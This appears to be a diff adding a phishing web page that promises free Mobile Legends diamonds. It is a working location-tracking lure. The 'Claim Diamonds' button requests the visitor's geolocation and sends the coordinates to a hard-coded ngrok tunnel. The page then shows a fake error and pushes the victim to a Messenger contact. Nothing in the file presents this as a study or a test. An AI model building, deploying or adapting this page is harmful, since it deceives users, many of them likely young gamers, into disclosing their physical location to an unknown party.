@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Diamonds</title>
+    <style>
+        input {
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 300px;
+            font-size: 1em;
+            margin-top: 20px;
+            background-color: rgba(255, 255, 255, 0.8);
+            color: rgb(0, 0, 0);
+            text-align: center;
+            outline: none;
+            transition: background-color 0.3s, box-shadow 0.3s;
+        }
+
+        input:focus {
+            background-color: rgba(255, 255, 255, 0.6);
+            box-shadow: 0 0 5px rgba(255, 255, 255, 0.7);
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('mlbb.png');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            position: relative;
+        }
+
+        h1 {
+            margin-top: 80px;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+        }
+
+        button {
+            background-color: #ff4081;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 20px;
+            position: relative; /* For positioning the spinner */
+        }
+
+        button:hover {
+            background-color: #ff1e61;
+        }
+
+        #loading {
+            display: none; /* Hide loading spinner by default */
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            border: 4px solid rgba(255, 255, 255, 0.6);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #location, #error {
+            margin-top: 20px;
+            font-size: 1.2em;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.7);
+        }
+
+        #error {
+            color: red; /* Error message color */
+        }
+
+        @media (max-width: 768px) {
+            body {
+                background-image: url('mlbbmobile.png');
+                justify-content: flex-start;
+            }
+            h1 {
+                margin-top: 100px;
+            }
+            button {
+                margin-top: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>Claim Your Free Diamonds!</h1>
+    <input id="codeInput" placeholder="Input codes here..." style="display: block;">
+    <button id="sendLocationBtn">
+        Claim Diamonds
+        <div id="loading"></div> <!-- Loading spinner -->
+    </button>
+    <div id="location"></div>
+    <div id="error" style="display: none;"></div> <!-- Error message -->
+    <button id="sendMessageBtn">GET THE CODES HERE!!!</button>
+
+    <script>
+        const locationDiv = document.getElementById('location');
+        const sendLocationBtn = document.getElementById('sendLocationBtn');
+        const sendMessageBtn = document.getElementById('sendMessageBtn');
+        const codeInput = document.getElementById('codeInput');
+        const loadingDiv = document.getElementById('loading');
+        const errorDiv = document.getElementById('error');
+
+        const sendLocation = (latitude, longitude) => {
+            const ngrokUrl = 'https://78c1-136-158-28-227.ngrok-free.app';
+            fetch(`${ngrokUrl}/location`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude, longitude }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                locationDiv.style.color = 'red';
+                locationDiv.innerHTML = 'ERROR! Claim the codes below';
+                stopLoading();
+            })
+            .catch(err => {
+                console.error(err);
+                locationDiv.innerHTML = 'Error sending location. Please try again.';
+                stopLoading();
+            });
+        };
+
+        const getLocation = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        startLoading(); // Show loading animation
+                        sendLocation(latitude, longitude);
+                    },
+                    (error) => {
+                        let errorMessage = '';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Location permission denied. Please enable location services.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Location information is unavailable.';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'The request to get user location timed out.';
+                                break;
+                            case error.UNKNOWN_ERROR:
+                                errorMessage = 'An unknown error occurred.';
+                                break;
+                        }
+                        errorDiv.innerHTML = errorMessage; // Display the error message
+                        errorDiv.style.display = 'block'; // Show error message
+                    }
+                );
+            } else {
+                errorDiv.innerHTML = 'Geolocation is not supported by this browser.';
+                errorDiv.style.display = 'block'; // Show error message
+            }
+        };
+
+        const startLoading = () => {
+            loadingDiv.style.display = 'block'; // Show loading spinner
+            sendLocationBtn.innerText = 'Claiming...'; // Change button text
+            sendLocationBtn.disabled = true; // Disable button
+        };
+
+        const stopLoading = () => {
+            loadingDiv.style.display = 'none'; // Hide loading spinner
+            sendLocationBtn.innerText = 'Claim Diamonds'; // Reset button text
+            sendLocationBtn.disabled = false; // Re-enable button
+        };
+
+        sendLocationBtn.addEventListener('click', () => {
+            errorDiv.style.display = 'none'; // Hide previous error messages
+            getLocation();
+            codeInput.style.display = 'block'; // Show the input when button is clicked
+        });
+
+        sendMessageBtn.addEventListener('click', () => {
+            const messengerUrl = 'https://m.me/61557613630949'; 
+            window.open(messengerUrl, '_blank');
+        });
+    </script>
+</body>
+</html>
